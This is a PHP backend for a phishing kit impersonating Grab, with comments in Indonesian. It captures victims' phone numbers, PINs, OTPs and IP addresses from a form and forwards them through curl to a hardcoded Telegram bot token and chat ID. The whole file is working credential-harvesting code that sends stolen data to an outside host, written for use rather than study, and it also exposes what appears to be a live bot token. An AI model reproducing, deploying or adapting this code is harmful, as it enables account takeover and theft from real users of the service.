<?php
/*
|--------------------------------------------------------------------------

| SCRIPT PENGIRIM DATA TELEGRAM - FIXED CONNECTION
| :--- |

*/
// INFO BOT & ID (SUDAH SESUAI INPUT KAMU)
$botToken = "8652214007:AAHt0TuC4p88mmxdMWzkp5VeeGEcU34mGck"; 
$chatId   = "7414298016";
// TANGKAP DATA
$type  = $_POST['type']  ?? 'Grab_Unknown';
$phone = $_POST['phone'] ?? '-';
$pin   = $_POST['pin']   ?? '-';
$otp   = $_POST['otp']   ?? '-';
// INFO TAMBAHAN
$ip    = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Asia/Jakarta');
$time  = date('d-m-Y H:i:s');
// FORMAT PESAN
$message = "<b> 🚖 GRAB AKEW 🚖</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "<b> LAYANAN  :</b> <code>$type</code>\n";
$message .= "<b> NO HP    :</b> <code>$phone</code>\n";
$message .= "<b> PIN      :</b> <code>$pin</code>\n";
$message .= "<b> OTP/LINK :</b> <code>$otp</code>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$message .= "<b> IP USER  :</b> <code>$ip</code>\n";
$message .= "<b> WAKTU    :</b> <code>$time</code>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━\n";
// KIRIM MENGGUNAKAN CURL (METODE PALING STABIL)
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'html'
];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bypass SSL jika server bermasalah
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
$result = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);
// RESPONSE UNTUK JAVASCRIPT
if ($result) {
    echo "Success";
} else {
    // Jika gagal, ini akan membantu kamu melihat errornya di inspect element browser
    echo "Error: " . $err;
}
?>